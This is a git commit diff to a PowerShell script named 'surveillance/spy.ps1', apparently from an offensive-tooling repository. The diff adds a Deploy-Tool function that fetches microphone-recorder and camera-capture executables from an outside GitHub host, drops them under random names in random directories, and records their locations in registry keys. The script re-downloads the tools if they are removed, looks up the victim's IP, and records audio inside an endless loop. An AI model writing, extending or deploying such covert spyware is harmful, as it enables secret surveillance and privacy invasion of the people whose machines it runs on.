f91e2feaaeb8a3f31582cde01559e7971670e371
soumyo001 <www.soumyo@gmail.com>
2025-11-28 16:40:54 +0600

    again textx7

--- surveillance/spy.ps1
+++ surveillance/spy.ps1
@@ -31,61 +31,92 @@ function Get-Paths {
     } | ? { if($null -ne $_) { Test-Path -Path "$_" -PathType Container } }
 }
 
-function Get-ToolPath {
-    param(
-        [string]$regKeyName,
-        [string]$valueName
-    )
+# function Get-ToolPath {
+#     param(
+#         [string]$regKeyName,
+#         [string]$valueName
+#     )
 
-    try{
-        $content = (iwr -uri "https://github.com/Soumyo001/offensive_powershell/raw/refs/heads/main/assets/config.txt" -UseBasicParsing).Content
-        $keyLine = ($content -split "`n" | Where-Object { $_ -like "$RegKeyName=*" }).Trim()
-        $valLine = ($content -split "`n" | Where-Object { $_ -like "$ValueName=*" }).Trim()
+#     try{
+#         $content = (iwr -uri "https://github.com/Soumyo001/offensive_powershell/raw/refs/heads/main/assets/config.txt" -UseBasicParsing).Content
+#         $keyLine = ($content -split "`n" | Where-Object { $_ -like "$RegKeyName=*" }).Trim()
+#         $valLine = ($content -split "`n" | Where-Object { $_ -like "$ValueName=*" }).Trim()
         
-        if(-not $keyLine -or -not $valLine) { return $null }
+#         if(-not $keyLine -or -not $valLine) { return $null }
 
-        $baseKey = $keyLine.Split('=')[1]
-        $keyValue = $valLine.Split('=')[1]
-        $baseKey = "HKCU:\$baseKey"
+#         $baseKey = $keyLine.Split('=')[1]
+#         $keyValue = $valLine.Split('=')[1]
+#         $baseKey = "HKCU:\$baseKey"
 
-        if(-not(Test-Path $baseKey)){
-            New-Item -Path $baseKey -Force | Out-Null
-        }
+#         if(-not(Test-Path $baseKey)){
+#             New-Item -Path $baseKey -Force | Out-Null
+#         }
 
-        $item = Get-ItemProperty -Path $baseKey -Name $keyValue -ErrorAction SilentlyContinue
-        if(-not $item -and -not $item.$keyValue -and (Test-Path -Path $item.$keyValue -PathType Leaf)){
-            return $item.$keyValue
-        }
-        return $null
+#         $item = Get-ItemProperty -Path $baseKey -Name $keyValue -ErrorAction SilentlyContinue
+#         if($item -and $item.$keyValue -and (Test-Path -Path $item.$keyValue -PathType Leaf)){
+#             return $item.$keyValue
+#         }
+#         return $null
     
-    }catch { return $null }
-}
+#     }catch { return $null }
+# }
 
-function Get-Tool {
-    param(
-        [string]$url, 
-        [string]$name, 
-        [string]$path
-    )
-    $path = Join-Path -Path $path -ChildPath "$name.exe"
-    if(-not (Test-Path -Path $path -PathType Leaf)) {
-        try {
-            iwr -Uri $url -OutFile $path -UseBasicParsing -ErrorAction Stop
-        } catch { " [-] Failed to download $name.exe: $($_.Message)" }
+# function Get-Tool {
+#     param(
+#         [string]$url, 
+#         [string]$name, 
+#         [string]$path
+#     )
+#     $path = Join-Path -Path $path -ChildPath "$name.exe"
+#     if(-not (Test-Path -Path $path -PathType Leaf)) {
+#         try {
+#             iwr -Uri $url -OutFile $path -UseBasicParsing -ErrorAction Stop
+#         } catch { " [-] Failed to download $name.exe: $($_.Message)" }
+#     }
+#     return $path
+# }
+
+function Deploy-Tool {
+    param($toolConfig, $dropPaths)
+    
+    $regPath = "HKCU:\$($toolConfig.regkey)"
+    $valName = $toolConfig.valuename
+    
+    # 1. Try to recover from registry first
+    $item = Get-ItemProperty -Path $regPath -Name $valName -ErrorAction SilentlyContinue
+    if($item -and (Test-Path -Path $item.$valName -PathType Leaf)) {
+        return $item.$valName
     }
-    return $path
+    
+    # 2. Otherwise: download to random safe dir
+    $targetDir = $dropPaths | Get-Random
+    $randomName = "$([System.IO.Path]::GetRandomFileName()).exe"
+    $finalPath = Join-Path -Path $targetDir -ChildPath $randomName
+    
+    try {
+        iwr -Uri $toolConfig.url -OutFile $finalPath -UseBasicParsing
+        if(-not (Test-Path -Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
+        Set-ItemProperty -Path $regPath -Name $valName -Value $finalPath -Type String -Force # TODO: Set Out-Null
+        return $finalPath
+    } catch {}
+    return $null
 }
 
-$dropPaths = Get-Paths
+$config = Get-Config
+if(-not $config) {exit}
 
-$mic_path = Get-ToolPath -regKeyName "MicRegKey" -valueName "MicValueName"
-if(-not $mic_path){
-    $mic_path = $dropPaths | Get-Random
-}
-$cam_path = Get-ToolPath -regKeyName "CamRegKey" -valueName "CamValueName"
-if(-not $cam_path){
-    $cam_path = $dropPaths | Get-Random
-}
+$dropPaths = Get-Paths -dropPaths $config.safe_dirs
+# $mic_path = Get-ToolPath -regKeyName "MicRegKey" -valueName "MicValueName"
+# if(-not $mic_path){
+#     $mic_path = $dropPaths | Get-Random
+# }
+# $cam_path = Get-ToolPath -regKeyName "CamRegKey" -valueName "CamValueName"
+# if(-not $cam_path){
+#     $cam_path = $dropPaths | Get-Random
+# }
+
+$mic_path = Deploy-Tool -toolConfig $config.mic -dropPaths $dropPaths
+$cam_path = Deploy-Tool -toolConfig $config.cam -dropPaths $dropPaths
 
 try {
     $ip = (Invoke-RestMethod -Uri "https://ifconfig.me/ip" -TimeoutSec 3 -ErrorAction SilentlyContinue)
@@ -131,15 +162,17 @@ while ($true) {
 
     if( $Counter % 12 -eq 0 -or $instant ) { # either mod with 12(3 min interval) or 20 (5 minute interval)
         if( -not( Test-Path -Path "$mic_path" -PathType Leaf ) ){
-            $mic_path = $dropPaths | Get-Random
-            $randomFileName = [System.IO.Path]::GetRandomFileName()
-            $mic_path = Get-Tool -url "https://github.com/Soumyo001/offensive_powershell/raw/refs/heads/main/assets/micrecorder.exe" -name $randomFileName -path $mic_path
+            # $mic_path = $dropPaths | Get-Random
+            # $randomFileName = [System.IO.Path]::GetRandomFileName()
+            # $mic_path = Get-Tool -url $config.mic.url -name $randomFileName -path $mic_path
+            $mic_path = Deploy-Tool -toolConfig $config.mic -dropPaths $dropPaths
             Write-Output "mic path: $mic_path"
         }
         if( -not( Test-Path -Path "$cam_path" -PathType Leaf ) ){
-            $cam_path = $dropPaths | Get-Random
-            $randomFileName = [System.IO.Path]::GetRandomFileName()
-            $cam_path = Get-Tool -url "https://github.com/Soumyo001/offensive_powershell/raw/refs/heads/main/assets/cam_cap.exe" -name $randomFileName -path $cam_path
+            # $cam_path = $dropPaths | Get-Random
+            # $randomFileName = [System.IO.Path]::GetRandomFileName()
+            # $cam_path = Get-Tool -url $config.cam.url -name $randomFileName -path $cam_path
+            $cam_path = Deploy-Tool -toolConfig $config.cam -dropPaths $dropPaths
             Write-Output "cam path: $cam_path"
         }
         $micParam = @("-o", "$BaseDir\mic_$env:USERNAME.wav", "-d", "10")
